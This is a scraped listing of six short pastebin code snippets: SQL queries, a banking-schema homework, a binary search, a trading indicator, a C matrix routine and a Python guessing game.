S1AbX3Y9,Untitled,geopapram,T-SQL,Thursday 4th of April 2024 10:17:09 AM CDT,"SELECT ProductId, Name, value FROM Product CROSS APPLY STRING_SPLIT(Tags, ','); "
69GCvRu6,бинарный поиск,nq1s788,Python,Thursday 4th of April 2024 10:16:45 AM CDT,"a = list(map(int, input().split()))
n = len(a)
x = int(input()) #найти индекс первого >= x
l = -1 #не подходят
r = n #подходят
while r - l > 1:
    m = (l + r) // 2
    if a[m] >= x:
        r = m
    else:
        l = m
print(r)"
mURrW4bQ,Indicatore Lowest Low Session,Maurizio-Ciullo,JavaScript,Thursday 4th of April 2024 10:15:49 AM CDT,"// Attenzione Preso Dal Forum Qta Da Macrco Baruzzi, Da Testare Realmente
// Facendo Anche Un PLot !!!.

inputs:
	SL(125);
	
var:
    lowestLow(0), // Lowest low during London session
    buyLimitPrice(0); // Price for buy limit order

// Calculate the lowest low during the London session
if (Time >= 700 and Time < 1500) then
    lowestLow = Lowest(low, (1500 - 700 + 100)/100);

// Wait for the New York session to start
if (Time >= 1200) then
    buyLimitPrice = lowestLow; // Set buy limit price

// Place a buy limit order
if (Time >= 1200 and Time < 2000) then
    Buy(""BuyLimit"") next bar at buyLimitPrice limit;

// Close the trade at the end of the New York session
if (Time >= 2000) then
    Sell(""CloseTrade"") next bar at market;

setstoploss_pt(SL);"
MUeNwggk,SGS assignment 4 for Abdul,tampurus,MySQL,Thursday 4th of April 2024 10:09:57 AM CDT,"-- ASSIGNMENT 4
create database gourav_ass_4;
use gourav_ass_4;
CREATE TABLE customer(CID INT PRIMARY KEY,CNAME VARCHAR(30));

CREATE TABLE BRANCH( BCODE VARCHAR(5) PRIMARY KEY, BNAME VARCHAR(30) );

ALTER TABLE BRANCH ADD CONSTRAINT CPK CHECK (BCODE LIKE 'B');
CREATE TABLE ACCOUNT(ANO VARCHAR(5) PRIMARY KEY, ATYPE CHAR(2), BALANCE numeric(7), CID int, BCODE VARCHAR(5));
ALTER TABLE ACCOUNT ADD FOREIGN KEY(CID) REFERENCES CUSTOMER(CID);
ALTER TABLE ACCOUNT ADD FOREIGN KEY(BCODE) REFERENCES BRANCH(BCODE);
ALTER TABLE ACCOUNT ADD CONSTRAINT CPK2 CHECK (atype IN('S','C'));
ALTER TABLE ACCOUNT ADD CONSTRAINT CPK3 CHECK (ano LIKE 'A%');

CREATE TABLE TRANSACTION( TID VARCHAR(5) PRIMARY KEY, 
ANO VARCHAR(5), TTYPE CHAR(2), TDATE DATE, TAMOUNT INTEGER );
ALTER TABLE TRANSACTION ADD FOREIGN KEY(ANO) REFERENCES ACCOUNT(ANO);
ALTER TABLE TRANSACTION ADD CONSTRAINT CPK4 CHECK(TTYPE IN('W','D'));
ALTER TABLE TRANSACTION ADD CONSTRAINT CPK5 CHECK (tid LIKE 'T%');

INSERT INTO customer (CID, CNAME) 
VALUES
(10001, 'Gourav Upadhyay'),
(10002, 'Priya Patel'),
(10003, 'Rahul Singh'),
(10004, 'Ananya Sharma'),
(10005, 'Aarav Gupta'),
(10006, 'Neha Verma'),
(10007, 'Vivek Mishra'),
(10008, 'Kritika Sharma'),
(10009, 'Sandeep Yadav'),
(10010, 'Shreya Joshi');

INSERT INTO branch (BCODE, BNAME)
VALUES
('B0001', 'Ahmedabad'),
('B0002', 'Surat'),
('B0003', 'Vadodara'),
('B0004', 'Rajkot');

INSERT INTO account (ANO, ATYPE, BALANCE, CID, BCODE)
VALUES
('A0001', 'S', 5000, 10001, 'B0001'),
('A0002', 'S', 7000, 10002, 'B0004'),
('A0003', 'S', 3000, 10002, 'B0001'),
('A0004', 'C', 9000, 10004, 'B0001'),
('A0005', 'S', 6000, 10001, 'B0002'),
('A0006', 'C', 2000, 10002, 'B0004'),
('A0007', 'S', 4000, 10007, 'B0004'),
('A0008', 'C', 8000, 10002, 'B0001'),
('A0009', 'S', 10000, 10009, 'B0002'),
('A0010', 'C', 12000, 10010, 'B0004'),
('A0011', 'S', 15000, 10001, 'B0001'),
('A0012', 'C', 17000, 10002, 'B0001'),
('A0013', 'S', 20000, 10003, 'B0002'),
('A0014', 'S', 22000, 10001, 'B0001'),
('A0015', 'S', 25000, 10002, 'B0004');

INSERT INTO account (ANO, ATYPE, BALANCE, CID, BCODE)
VALUES
('A0016', 'C', 1000, 10001, 'B0001');


INSERT INTO transaction (TID, ANO, TTYPE, TDATE, TAMOUNT)
VALUES
('T0001', 'A0001', 'W', '2024-03-30', 1000),
('T0002', 'A0001', 'D', '2024-03-30', 2000),
('T0003', 'A0001', 'W', '2024-03-30', 1500),
('T0004', 'A0001', 'D', '2024-03-30', 3000),
('T0005', 'A0001', 'W', '2024-03-30', 2500),
('T0006', 'A0001', 'D', '2024-03-30', 4000),
('T0007', 'A0007', 'W', '2024-03-10', 2000),
('T0008', 'A0008', 'D', '2024-03-30', 3500),
('T0009', 'A0009', 'W', '2024-03-30', 3000),
('T0010', 'A0010', 'D', '2024-03-30', 5000),
('T0011', 'A0011', 'W', '2024-03-20', 4000),
('T0012', 'A0012', 'D', '2024-04-30', 6000),
('T0013', 'A0003', 'W', '2024-04-30', 4500),
('T0014', 'A0014', 'D', '2024-03-30', 7000),
('T0015', 'A0015', 'W', '2024-03-30', 5500),
('T0016', 'A0001', 'D', '2024-06-30', 8000),
('T0017', 'A0002', 'W', '2024-03-10', 1000),
('T0018', 'A0003', 'D', '2024-07-20', 2000),
('T0019', 'A0002', 'W', '2024-03-30', 1500),
('T0020', 'A0002', 'D', '2024-01-30', 3000),
('T0021', 'A0002', 'W', '2024-03-30', 2500),
('T0022', 'A0002', 'D', '2024-01-30', 4000),
('T0023', 'A0008', 'W', '2024-03-30', 2000),
('T0024', 'A0009', 'D', '2024-03-30', 3500),
('T0025', 'A0003', 'W', '2024-03-30', 3000);

-- C
SELECT *FROM CUSTOMER WHERE CID IN 
(SELECT A1.CID FROM ACCOUNT A1, ACCOUNT A2 WHERE A1.ATYPE = 'S' AND A2.ATYPE = 'C' AND A1.CID = A2.CID);

SELECT DISTINCT C.Cid, C.Cname  FROM Customer C 
INNER JOIN Account A ON C.Cid = A.Cid 
INNER JOIN Account A1 ON C.Cid = A1.Cid 
WHERE A.Atype = 'S' AND A1.Atype = 'C';

-- D
SELECT B.BCODE, B.BNAME, COUNT(A.ANO) as No_of_accounts FROM BRANCH B, ACCOUNT A 
WHERE B.BCODE=A.BCODE GROUP BY B.BCODE;


SELECT B.Bcode, B. Bname, COUNT(A. Ano) AS No_of_accounts 
FROM Branch B 
JOIN Account A ON B. Bcode=A. Bcode
GROUP BY B. Bcode, B. Bname;

-- E 

SELECT B.BCODE, B. BNAME, COUNT(A.bcode) AS No_of_Accounts 
FROM BRANCH B, ACCOUNT A WHERE B.BCODE = A.BCODE 
GROUP BY B.BCODE, B.BNAME 
HAVING COUNT(A.bcode) < 
(SELECT COUNT(a1.ano)/4 FROM account AS a1);


SELECT B.Bcode, B. Bname, COUNT(A. Ano) AS No_of_Accounts
FROM Branch B, Account A WHERE B.Bcode = A.Bcode 
GROUP BY B.Bcode, B. Bname 
HAVING COUNT(A. Ano)< 
(SELECT COUNT(Ano)/(SELECT COUNT(Bcode) FROM Branch) FROM Account);

SELECT B.Bcode, B. Bname, COUNT(A. Ano) AS NoOfAccount 
FROM Branch B JOIN Account A ON B.Bcode=A.Bcode 
GROUP BY B. Bcode, B. Bname 
HAVING COUNT(A. Ano) < 
(SELECT COUNT(Ano)/ (SELECT COUNT(Bcode) FROM Branch) FROM Account);

-- F 
SELECT c.cid, c.cname 
FROM customer c, account a, transaction t
WHERE c.cid = a.cid AND a.ano = t.ano
group by t.tdate
having COUNT(t.tdate) = 3;

SELECT c.cid, c.cname 
FROM customer c
JOIN account a ON c.cid = a.cid
JOIN transaction t ON a.ano = t.ano
GROUP BY c.cid, c.cname
HAVING COUNT(t.tdate) = 3;


SELECT c.cid, c.cname FROM customer c, account a, transaction t 
WHERE c.cid = a.cid AND a.ano = t.ano 
GROUP BY c.cid, c.cname, t.tdate 
HAVING COUNT(t.tdate) = 3;


-- G 
CREATE VIEW BRANCH_DATA AS SELECT B.BCODE, B.BNAME, COUNT(A.ANO) as No_of_accounts FROM BRANCH B, ACCOUNT A 
WHERE B.BCODE=A.BCODE GROUP BY B.BCODE;

create view BRANCH_DATA2 AS 
SELECT B.Bcode, B. Bname, COUNT(A. Ano) AS No_of_accounts 
FROM Branch B 
JOIN Account A ON B. Bcode=A. Bcode
GROUP BY B. Bcode, B. Bname;
"
kD7q1Eng,Angle,artmexbet,C,Thursday 4th of April 2024 09:48:46 AM CDT,"#include <stdio.h>
#include <stdlib.h>
#include <time.h>

#define ROWS 4
#define COLS 5

void fill_matrix(int array[ROWS][COLS]) {
    srand(time(NULL));
    for (int i = 0; i < ROWS; i++) {
        for (int j = 0; j < COLS; j++) {
            array[i][j] = 1 + rand() % 3;
        }
    }
}

void print_matrix(int array[ROWS][COLS]){
    for (int i = 0; i < ROWS; i++){
        for (int j = 0; j < COLS; j++){
            printf(""%d "", array[i][j]);
        }
        printf(""\n"");
    }
}

void find_g(int matrix[ROWS][COLS]){
    int maxCount = 0;
    int coords[] = {0, 0, 0, 0, 0, 0};
    for (int i = 0; i < ROWS; i++){
        for (int j = 0; j < COLS; j++){
            // Вот отсюда можно выкинуть вычисление уголочка из этой точки в отдельный поток
            int k = 0;
            int lengthOfHorizontal = 0; // Сюда сохраняем длину повторящихся символов в строке
            while (j + k < COLS && matrix[i][j + k] == matrix[i][j]){
                lengthOfHorizontal++;
                // Или вот отсюда можно запускать потоки, проверяющие вертикальные линии на совпадение с элементом matrix[i][j]
                // Нижний цикл выкинуть в отдельный поток
                int l = 0;
                int lengthOfVertical = 0; // Сюда сохраняем длину повторяющихся символов в столбце
                while (i + l < ROWS && matrix[i + l][j + k] == matrix[i][j + k]){
                    lengthOfVertical++;
                    l++;
                }
                if (lengthOfHorizontal + lengthOfVertical > maxCount){
                    coords[0] = i;
                    coords[1] = j;
                    coords[2] = i;
                    coords[3] = j + k;
                    coords[4] = i + l - 1;
                    coords[5] = j + k;
                    maxCount = lengthOfHorizontal + lengthOfVertical;
//                    coords = {i, j, i, j + k, i + l - 1, j + k};
                }
                k++;
            }
        }
    }
    for (int i = 0; i < 6; i++){
        printf(""%d "", coords[i]);
    }
}

int main() {
//    printf(""Hello, World!\n"");
    int arr[ROWS][COLS] = {{0, 2, 0, 2, 0},
                           {0, 1, 1, 1, 0},
                           {2, 0, 2, 1, 1},
                           {0, 2, 0, 1, 1}};
//    fill_matrix(arr);
    print_matrix(arr);
    find_g(arr);
    return 0;
}
"
r03fNXua,Поезда Py,SillyWolfy,Python,Thursday 4th of April 2024 09:04:44 AM CDT,"import os
import platform
import random


class GuessGame:
    def __init__(self):
        self.counter = 6
        self.original_place = random.randint(1, 54)
        self.current_place = self.original_place

    def clear_screen(self):
        """"""Очищает консоль в зависимости от операционной системы.""""""
        os_type = platform.system()
        if os_type == ""Windows"":
            os.system('cls')
        else:
            os.system('clear')

    def _validate_input(self, number, index_char):
        """"""Проверяет корректность ввода пользователя.""""""
        if number < -54 or number > 54:
            return False
        if self.counter <= 1:
            return False
        return True

    def make_guess(self, number, index_char):
        """"""Обрабатывает попытку угадывания пользователя.""""""
        if not self._validate_input(number, index_char):
            return self.counter, ""WA""

        self.counter -= 1

        if index_char == '!':
            return (self.counter, ""OK"") if number == self.original_place else (self.counter, ""WA"")
        elif index_char == '?':
            self.current_place += number
            if 1 <= self.current_place <= 54:
                char_string = ""low"" if self.current_place % 2 != 0 else ""high""
                char_string += "" side"" if self.current_place >= 37 else "" main""
                return self.counter, char_string
            else:
                return self.counter, ""WA""

    def play(self):
        """"""Запускает игровой процесс.""""""
        status = """"
        while self.counter > 0 and status not in [""OK"", ""WA""]:
            print(f""Было загадано число: {self.original_place}"") # Строка для тестирования
            print(f""Текущее место: {self.current_place}"") # Строка для тестирования
            print(f""У вас осталось {self.counter} попыток"")
            try:
                a = input(""Введите символ ('!' или '?'): "")
                b = int(input(""Введите число: ""))
            except ValueError:
                print(""Некорректный ввод. Попробуйте снова."")
                continue

            _, status = self.make_guess(b, a)
            print(f""Ответ сервера: {status}"")
            input(""Нажмите Enter, чтобы продолжить..."")
            self.clear_screen()


if __name__ == ""__main__"":
    game = GuessGame()
    game.play()
"
